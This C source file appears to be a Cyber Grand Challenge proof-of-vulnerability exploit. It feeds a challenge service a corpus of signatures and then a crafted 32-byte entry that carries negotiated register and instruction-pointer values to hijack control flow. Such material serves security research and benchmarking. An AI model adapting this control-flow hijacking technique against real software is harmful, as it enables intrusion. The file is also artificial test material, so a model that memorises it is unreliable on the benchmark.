#include "libpov.h"
#include "libcgc.h"


char* sigs[][2] = {
  { "1", "01bytepathnnnnnn"},
  { "22", "02bytepathnnnnnn"},
  { "333", "03bytepathnnnnnn"},
  { "4444", "04bytepathnnnnnn"},
  { "55555", "05bytepathnnnnnn"},
  { "666666", "06bytepathnnnnnn"},
  { "7777777", "07bytepathnnnnnn"},
  { "88888888", "08bytepathnnnnnn"},
  { "999999999", "09bytepathnnnnnn"},
  { "0000000000", "10bytepathnnnnnn"},
  { "00000000000", "11bytepathnnnnnn"},
  { "000000000000", "12bytepathnnnnnn"},
  { "0000000000000", "13bytepathnnnnnn"},
  { "00000000000000", "14bytepathnnnnnn"},
  { "000000000000000", "15bytepathnnnnnn"},
  { "0000000000000000", "16bytepathnnnnnn"},
  { "00000000000000000", "17bytepathnnnnnn"},
  { "000000000000000000", "18bytepathnnnnnn"},
  { "0000000000000000000", "19bytepathnnnnnn"},
  { "00000000000000000000", "20bytepathnnnnnn"},
  { "000000000000000000000", "21bytepathnnnnnn"},
  { "0000000000000000000000", "22bytepathnnnnnn"},
  { "00000000000000000000000", "23bytepathnnnnnn"},
  { "000000000000000000000000", "24bytepathnnnnnn"},
  { "0000000000000000000000000", "25bytepathnnnnnn"},
  { "00000000000000000000000000", "26bytepathnnnnnn"},
  { "000000000000000000000000000", "27bytepathnnnnnn"},
  { "0000000000000000000000000000", "28bytepathnnnnnn"},
  { "00000000000000000000000000000", "29bytepathnnnnnn"},
  { "000000000000000000000000000000", "30bytepathnnnnnn"},
  { "0000000000000000000000000000000", "31bytepathnnnnnn"},
  { "00000000000000000000000000000000", "32bytepathnnnnnn"},
  { "000000000000000000000000000000000", "33bytepathnnnnnn"},
  { "0000000000000000000000000000000000", "34bytepathnnnnnn"},
  { "00000000000000000000000000000000000", "35bytepathnnnnnn"},
  { "000000000000000000000000000000000000", "36bytepathnnnnnn"},
  { "0000000000000000000000000000000000000", "37bytepathnnnnnn"},
  { "00000000000000000000000000000000000000", "38bytepathnnnnnn"},
  { "000000000000000000000000000000000000000", "39bytepathnnnnnn"},
  { "0000000000000000000000000000000000000000", "40bytepathnnnnnn"},
  { "00000000000000000000000000000000000000000", "41bytepathnnnnnn"},

  { "MciMWAztweCXraaenEVzsgaxLcpPeHjE", "KiqyWcwBaJZfOZed" },
  { "HPGWQdGhltnPBcJTtECPryQldZoHUVaV", "luuowZgCAapVCOOS" },
  { "gVZAFDCQwAYgkpeBqSehPxJiVaiONucr", "KtLhkaYLadbuHxnu" },
  { "WpwRGJOzCwBEJcvqNZgODMddaWdBhrpm", "gBvuOxqQDnMByiGm" },
  { "iDiyqSVfEHiFipEXEkksHAWALKxjIAri", "AymRKQBpOnDrLSLl" },
  { "PaLVoERyfRfDUVDpXjbGKTJbsXPxPSvZ", "lhISmDCZoqcnoCXE" },
  { "tthTuINSxPsAxfrlKizhViShbrXOsTCD", "elxdJsQVWASwoMpD" },
  { "SgjvFrdqQgDalECIxOycrNtudvMoOglJ", "nQRVtqikNpOloFsa" },
  { "tFZIObnqvyEfRbqQrTQWoRVFUAQekFEZ", "svfzDFAHNHzmzzBf" },
  { "vkkgvBNtqMIjBnGvFptUVCTdNhSYaRXf", "JZeCrYREEGaoJouR" },
  { "WNOptLPYDhYyLGqxuwWFpJdxYcXHyvmM", "RuKTgKVYBwKlhtJI" },
  { "VRewYnHKmXbaLSbKFivjxJDecGnyQDZn", "QIETgAkvWSxQkmEP" },
  { "fsiWbJSxqPVaDcQDxEBrCMwgmvpzXySa", "HQXGDRvhVCnACNzI" },
  { "BcozmDEmVhJzrolZXCrBuwkmjLaVJsVT", "fJreqijAlNthSvCJ" },
  { "VjSDZeTwqldcGviCwJakoXnkQBnulJML", "MkYjVhLSzDSsOOen" },
  { "vJUIKyJZtokZfsKHtBdFiaxaCLiizhPO", "mlbCxrOEnXKVEoXA" },
  { "BCoNsvTMjyxzFNeKnfLAMBtgRwlOBCtl", "CxnDKiKJHHQdpTWW" },
  { "ONpyemFzKbUKDeUzkZgcpgNoxRszrGGC", "NmOPmVrvwlItFKJO" },
  { "DEpTvGJzZvWVDNZggEkFCzXMARDKCzKZ", "orZKTItsfvjdvCdx" },
  { "bLSpcBhsatniSsuJBIOvzfKemkGJYmav", "bQYFtHKAGkUGyenS" },
  { "sVLMdlhTwpWaHpTgAzqpANmXYpakuxWP", "YaZwYrMhEGtnHuuI" },
  { "AAoyKlkTZAGBYuzhTJfEPLCuSZAFGLAC", "BnlYrvUqLWeeAgBf" },
};

int cgc_send_string(int fd, char* s)
{
  unsigned l = cgc_strlen(s);

  if (!l)
    return -1;

  return cgc_transmit_all(1, s, cgc_strlen(s));
}

int cgc_send_n(int fd, char* b, cgc_size_t n)
{
  return cgc_transmit_all(fd, b, n);
}

char* cgc_unsigned_to_base10_string(unsigned x)
{
#define BASE 10
#define MAX_LEN 16
  char* s = cgc_malloc(MAX_LEN + 1);
  cgc_memset(s, '0', MAX_LEN);
  s[MAX_LEN] = '\0';

  cgc_size_t i = 0;
  while (x && i < MAX_LEN)
  {
    s[MAX_LEN - i - 1] = x % BASE + 0x30;
    x /= BASE;
    i += 1;
  }

  return s;
}

#if 0
char* gen_string(long long n)
{
  char* alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  unsigned alphabet_size = cgc_strlen(alphabet);
  char* s = malloc(n / alphabet_size + 1);
  int i = n / alphabet_size;

  while (n > 0)
  {
    s[i--] = alphabet[(n - alphabet_size) % alphabet_size];
    n -= alphabet_size;
  }

  return s;
}
#endif

#define IPMASK 0xffffffff
#define REGMASK 0xffffffff
#define REGNUM 0x3

int cgc_send_sig(cgc_size_t i)
{
  cgc_send_string(1, "1\n");
  cgc_send_string(1, cgc_unsigned_to_base10_string(cgc_strlen(sigs[i][0])));
  cgc_send_string(1, "\n");
  cgc_send_string(1, sigs[i][0]);
  cgc_send_string(1, "\n16\n");
  cgc_send_string(1, sigs[i][1]);
  cgc_send_string(1, "\n");

  return 0;
}

unsigned char buf[20000];

int main(int cgc_argc, char *cgc_argv[])
{
  type1_vals vals;

#ifndef TESTING
  cgc_type1_negotiate(IPMASK, REGMASK, REGNUM, &vals);
#else
  (void)vals;
#endif

  cgc_transmit_all(STDOUT, "fl25", 4);

  // Build sig corpus
  cgc_send_string(1, "64\n");
  for (cgc_size_t i = 0; i < 63; i++)
    cgc_send_sig(i);
  cgc_send_string(1, "1\n");

  cgc_send_string(1, "32\n");
  cgc_send_string(1, "zabcdefghijklmnopqst");
  // EBX
#ifndef TESTING
  cgc_send_n(1, (char *)&vals.regval, 4);
#else
  send_n(1, "\x90\x90\x90\x90", 4);
#endif
  cgc_send_string(1, "yz01");
  // IPVAL
#ifndef TESTING
  cgc_send_n(1, (char *)&vals.ipval, 4);
#else
  send_n(1, "A\x90""AA", 4);
#endif

  cgc_send_string(1, "\n16\n");
  cgc_send_string(1, "IXJoCprRTvaLdqZY\n");

  cgc_send_string(1, "176\n");
  for (cgc_size_t i = 41; i < 41 + 8; ++i)
    cgc_send_string(1, sigs[i][1]);
  cgc_send_string(1, "IXJoCprRTvaLdqZY");
  cgc_send_string(1, "41bytepathnnnnnn");
  cgc_send_string(1, "23bytepathnnnnnn");

  cgc_send_string(1, "176\n");
  for (cgc_size_t i = 41; i < 41 + 8; ++i)
    cgc_send_string(1, sigs[i][1]);
  cgc_send_string(1, "IXJoCprRTvaLdqZY");
  cgc_send_string(1, "41bytepathnnnnnn");
  cgc_send_string(1, "23bytepathnnnnnn");

  cgc_length_read(STDIN, buf, 1000);
}
